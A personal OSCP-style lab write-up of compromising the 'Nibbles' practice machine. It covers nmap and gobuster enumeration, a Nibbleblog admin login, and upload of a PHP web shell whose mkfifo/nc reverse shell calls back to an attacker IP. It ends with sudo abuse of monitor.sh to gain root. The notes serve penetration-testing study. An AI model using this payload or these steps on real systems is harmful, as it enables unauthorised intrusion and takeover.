---
title: Box Template
type: template
permalink: oscp/templates/box-template
tags:
  - template
---

# Nibbles

## Steps I took
#### Enumrate with nmap scan
```bash
nmap -sV --open -oA nibbles_initial_scan 10.129.42.190
```

##### Output
```bash
Nmap scan report for 10.129.42.190 
Host is up (0.11s latency). 
Not shown: 991 closed ports, 7 filtered ports 
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit 
PORT STATE SERVICE VERSION 
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 
80/tcp open http Apache httpd <REDACTED> ((Ubuntu)) 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. 
Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.82 seconds
```
- web server is up so we use gobuster to enumerate

### Go to `http://$ip`
- `Ctrl + U` to on page to find `nibbleblog` directory 
#### Gobuster enumeration with nibbleblog
```bash
gobsuter dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
```

##### Output
```bash
/.hta (Status: 403) 
/.htaccess (Status: 403) 
/.htpasswd (Status: 403) 
/admin (Status: 301) 
/admin.php (Status: 200) 
/content (Status: 301) 
/index.php (Status: 200) 
/languages (Status: 301) 
/plugins (Status: 301) 
/README (Status: 200) 
/themes (Status: 301)
```

#### Look in README 
```bash
curl http://10.129.42.190/nibbleblog/README
```

##### Output
```bash
====== Nibbleblog ====== 
Version: v4.0.3 Codename: Coffee 
Release date: 2014-04-01 
Site: http://www.nibbleblog.com 
Blog: http://blog.nibbleblog.com 
Help & Support: http://forum.nibbleblog.com 
Documentation: http://docs.nibbleblog.com 
===== Social ===== 
* Twitter: http://twitter.com/nibbleblog 
* Facebook: http://www.facebook.com/nibbleblog 
* Google+: http://google.com/+nibbleblog 
===== System Requirements ===== 
* PHP v5.2 or higher 
* PHP module - DOM 
* PHP module - SimpleXML 
* PHP module - GD 
* Directory “content” writable by Apache/PHP
```

### Go to login page at `/admin`
![[Pasted image 20260818000229.png]]
- `config.xml` found in `/content/private` and the output of the xml showed that the email used was `admin@nibbles.com` so we use nibbles to login

#### Go to this page and upload a shell
![[Pasted image 20260818000500.png]]

#### Shell.php
```bash
<?php system ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.27 9001 >/tmp/f'); ?>
```

#### Set up listener and curl the page the shell saved to
```bash
curl http:/10.129.122.215/nibbleblog/content/private/plugins/my_image/image.php

```

- Grab `user.txt` flag from `home/nibbles`
- Find `monitor.sh` after unzipping `personal.zip`
- run `LinEnum.sh` inside shell
- Find out we can run `monitor.sh` as sudo user
- add reverse shell in `monitor.sh`
- Run `monitor.sh`
- Get into root shell and get `root.txt`flag 
## Techniques used
[[Gobuster]]
[[Nmap -sC and -sV (service + script scanning)]]
[[]]

## What I learned


## What I could do better

